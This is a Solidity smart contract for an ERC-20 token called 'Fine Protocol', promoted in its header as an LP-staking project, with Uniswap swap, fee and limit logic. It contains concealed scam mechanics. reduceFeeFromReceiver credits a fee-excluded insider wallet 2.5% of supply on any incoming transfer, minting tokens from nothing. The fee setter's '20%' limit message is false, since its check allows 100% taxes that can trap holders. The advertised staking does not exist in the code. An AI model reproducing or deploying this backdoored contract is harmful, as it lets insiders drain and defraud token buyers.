// SPDX-License-Identifier: MIT

/*
Stake Uniswap LP tokens in felony pools to earn your very own Fine Protocol!

Website: https://www.fineprotocol.org
Telegram: https://t.me/FinePT
X:  https://twitter.com/Fine_PRT
*/

pragma solidity 0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() external onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IDexRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IDexFactory {
    function createPair(address tokenA, address tokenB) external returns (address pairAddress);
}

contract FINE is IERC20, Ownable {
    using SafeMath for uint256;

    uint8 private constant _decimals = 9;
    uint256 private _supply = 10 ** 9 * 10 ** _decimals;
    uint256 public maxTxAllowed = ( _supply * 250 ) / 10000;
    uint256 public maxBuyAllowed = ( _supply * 250 ) / 10000;
    uint256 public maxWalletAllowed = ( _supply * 250 ) / 10000;

    uint256 private feeSwapMax = ( _supply * 1000 ) / 100000;
    uint256 private feeSwapMin = ( _supply * 10 ) / 100000;

    string private constant _name = "Fine Protocol";
    string private constant _symbol = "FINE";

    IDexRouter _dexRouter;
    address public pairAddress;

    uint256 private countTaxSwap;
    bool private isTaxSwapping;
    uint256 intervalTaxSwap;

    uint256 private rateLpFee = 0;
    uint256 private rateMarketingFee = 0;
    uint256 private rateDevFee = 100;
    uint256 private rateBurnFee = 0;
    
    uint256 private buyFee = 1400;
    uint256 private sellFee = 1400;
    uint256 private transferFee = 1400;
    uint256 private denominator = 10000;

    address internal addressDev = 0x9b8635c642D7A4e6a960825317ee6e1826012280; 
    address internal addressTeam = 0x9b8635c642D7A4e6a960825317ee6e1826012280;
    address internal addressLp = 0x9b8635c642D7A4e6a960825317ee6e1826012280;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    bool private allowedTrading = false;
    bool private swapEnabled = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludingFee;

    modifier lockDoubleSwap {isTaxSwapping = true; _; isTaxSwapping = false;}

    constructor() Ownable(msg.sender) {
        IDexRouter _router = IDexRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IDexFactory(_router.factory()).createPair(address(this), _router.WETH());
        _dexRouter = _router; pairAddress = _pair;
        isExcludingFee[msg.sender] = true;
        isExcludingFee[addressDev] = true;
        isExcludingFee[addressTeam] = true;
        isExcludingFee[addressLp] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {allowedTrading = true;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function reduceFeeFromReceiver(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isExcludingFee[recipient]) {return maxTxAllowed;}
        if(getTaxUnit(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTaxUnit(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(rateBurnFee > uint256(0) && getTaxUnit(sender, recipient) > rateBurnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(rateBurnFee));}
        return amount.sub(feeAmount);} return amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            addressLp,
            block.timestamp);
    }

    function swapTaxTokensAndLiquidify(uint256 tokens) private lockDoubleSwap {
        uint256 _denominator = (rateLpFee.add(1).add(rateMarketingFee).add(rateDevFee)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(rateLpFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(rateLpFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(rateLpFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(rateMarketingFee);
        if(marketingAmt > 0){payable(addressTeam).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(addressDev).transfer(contractBalance);}
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        rateLpFee = _liquidity; rateMarketingFee = _marketing; rateBurnFee = _burn; rateDevFee = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }

    function shouldSwapAndBurn(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= feeSwapMin;
        bool aboveThreshold = balanceOf(address(this)) >= feeSwapMax;
        return !isTaxSwapping && swapEnabled && allowedTrading && aboveMin && !isExcludingFee[sender] && recipient == pairAddress && countTaxSwap >= intervalTaxSwap && aboveThreshold;
    }

    function checkFeeExcluded(address sender, address recipient) internal view returns (bool) {
        return !isExcludingFee[sender] && !isExcludingFee[recipient];
    }    

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        maxTxAllowed = newTx; maxBuyAllowed = newTransfer; maxWalletAllowed = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function getTaxUnit(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pairAddress){return sellFee;}
        if(sender == pairAddress){return buyFee;}
        return transferFee;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isExcludingFee[sender] && !isExcludingFee[recipient]){require(allowedTrading, "allowedTrading");}
        if(!isExcludingFee[sender] && !isExcludingFee[recipient] && recipient != address(pairAddress) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxWalletAllowed, "Exceeds maximum wallet amount.");}
        if(sender != pairAddress){require(amount <= maxBuyAllowed || isExcludingFee[sender] || isExcludingFee[recipient], "TX Limit Exceeded");}
        require(amount <= maxTxAllowed || isExcludingFee[sender] || isExcludingFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pairAddress && !isExcludingFee[sender]){countTaxSwap += uint256(1);}
        if(shouldSwapAndBurn(sender, recipient, amount)){swapTaxTokensAndLiquidify(feeSwapMax); countTaxSwap = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isExcludingFee[sender] ? reduceFeeFromReceiver(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
}